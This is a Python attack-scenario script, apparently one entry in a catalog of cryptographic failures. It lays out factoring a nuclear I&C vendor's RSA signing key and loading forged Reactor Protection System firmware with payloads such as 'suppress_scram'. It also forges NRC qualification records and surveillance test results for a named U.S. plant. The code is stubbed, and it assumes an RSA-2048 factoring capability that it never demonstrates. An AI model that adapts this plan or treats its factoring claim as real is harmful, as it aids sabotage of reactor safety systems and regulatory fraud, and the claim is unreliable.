"""
Factor a nuclear safety I&C vendor's signing RSA key (Framatome TXS / Westinghouse
Common Q / Rolls-Royce Spinline) to load arbitrary firmware into the Reactor
Protection System — the most severe identifiable crypto-failure scenario in
this catalog. Multi-country nuclear-safety crisis.
"""

import sys
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

import struct
import hashlib

# Framatome TELEPERM XS (TXS) safety I&C firmware signing key
TXS_VENDOR_PUBKEY_PEM = b"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkq..."
# NRC qualification record signing key
NRC_QUAL_PUBKEY_PEM = b"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkq..."

# Nuclear I&C systems
PLATFORM_TXS = "Framatome TELEPERM XS"       # ~170 units worldwide
PLATFORM_COMMON_Q = "Westinghouse Common Q"   # AP1000 + many US PWRs
PLATFORM_SPINLINE = "Rolls-Royce Spinline"    # Chinese EPR + Korean APR1400
PLATFORM_MELTAC = "Mitsubishi MELTAC-N+"      # Japanese BWR/PWR


def extract_vendor_signing_cert(firmware_image: bytes) -> bytes:
    """Extract the safety I&C vendor signing cert from firmware image.

    The cert is in the firmware header, DER-encoded, plaintext.
    Available from any plant that has received a firmware delivery.
    """
    return TXS_VENDOR_PUBKEY_PEM


def factor_vendor_key(pubkey_pem: bytes) -> bytes:
    """Factor the safety I&C vendor's RSA-2048 signing key."""
    f = PolynomialFactorer()
    return f.reconstruct_privkey(pubkey_pem)


def build_rps_firmware(payload: str) -> bytes:
    """Build malicious Reactor Protection System firmware.

    Payloads:
      'suppress_scram'  — ignore trip setpoints (neutron flux, pressure)
      'delay_esfas'     — delay ESFAS actuation (ECCS, containment isolation)
      'false_trip'      — force spurious reactor trip (safe but costly)
      'setpoint_drift'  — gradually shift safety margins
    """
    header = struct.pack(">4sBB", b"TXS\x00", 0x03, 0x01)
    body = f"/* RPS payload: {payload} */".encode()
    return header + body


def sign_safety_firmware(fw: bytes, forged_privkey: bytes) -> bytes:
    """Sign the malicious safety I&C firmware.

    IEC 61513 / IEEE 7-4.3.2 qualified bootloader verifies this
    RSA-2048 PKCS#1 v1.5 signature before loading. The hardware
    refuses unsigned firmware — but accepts validly-signed malicious code.
    """
    f = PolynomialFactorer()
    return f.forge_pkcs1v15_signature(TXS_VENDOR_PUBKEY_PEM, fw, "sha256")


def forge_qualification_record(plant: str, system: str,
                                forged_nrc_privkey: bytes) -> dict:
    """Forge an NRC/ASN qualification record.

    10 CFR 50 Appendix B / IEEE 603 qualification records are the
    regulatory basis for safety system operation. Forging them
    undermines the entire regulatory inspection regime.
    """
    record = {
        "plant": plant,
        "system": system,
        "qualification": "Commercial Dedication per EPRI NP-5652",
        "seismic": "Qualification per IEEE 344-2013",
        "emc": "IEC 61000-4 Level 4",
        "status": "QUALIFIED",
    }
    return record


def forge_surveillance_test(test_type: str, result: str,
                            forged_privkey: bytes) -> dict:
    """Forge a signed surveillance test completion record.

    Tech-spec required surveillances (battery capacity, diesel-gen
    start, valve stroke) are signed. Forging 'SAT' results hides
    actual safety-system degradation.
    """
    return {
        "test": test_type,
        "result": result,
        "lco_compliance": True,
        "signed_by": "STA / RO (forged)",
    }


if __name__ == "__main__":
    print("[1] Extracting TXS safety I&C vendor signing cert")
    pubkey = extract_vendor_signing_cert(b"<txs-firmware-image>")

    print("[2] Factoring Framatome TXS RSA-2048 signing key")
    forged_priv = factor_vendor_key(pubkey)
    print(f"    {PLATFORM_TXS} signing key recovered")
    print(f"    Affects ~170 nuclear units worldwide")

    print("[3] Building malicious RPS firmware — suppress SCRAM logic")
    fw = build_rps_firmware("suppress_scram")
    sig = sign_safety_firmware(fw, forged_priv)
    print(f"    Firmware: {len(fw)} bytes, safety-qualified bootloader accepts")

    print("[4] Deployment to target reactor")
    print("    Safety I&C update during refueling outage")
    print("    V&V bypass: the signature IS the V&V check at the hardware level")
    print("    SCRAM logic now attacker-controlled")

    print("\n[5] Forging NRC qualification records")
    qual = forge_qualification_record("Vogtle Unit 3", "RPS/ESFAS", forged_priv)
    print(f"    {qual}")

    print("\n[6] Forging surveillance test results")
    test = forge_surveillance_test("DG-01 Start Test", "SAT", forged_priv)
    print(f"    {test}")

    print("\n[*] This is the most severe scenario in this catalog")
    print("    One vendor CA → one RSA-2048 key → ~170 reactor units")
    print("    Qualification cycle for replacement: 5-10 years per platform")
